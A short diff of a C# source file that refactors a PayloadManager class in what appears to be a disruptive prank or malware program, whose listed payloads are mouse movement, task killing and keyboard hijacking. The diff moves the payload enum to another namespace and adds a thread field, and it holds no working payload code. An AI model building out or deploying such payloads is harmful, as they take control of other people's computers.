@@ -5,19 +5,15 @@ using System.Net;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using Enums;
 
-namespace ISBD
+
+namespace ISBDPayload
 {
-    public enum Payload
-    {
-        MouseMove,
-        TaskKiller,
-        KeyboardHijack
-    }
-
     class PayloadManager
     {
         private Dictionary<Payload, IPayload> myPayloads = new Dictionary<Payload, IPayload>();
+        private Thread myPayloadThread;
 
         public PayloadManager()
         {
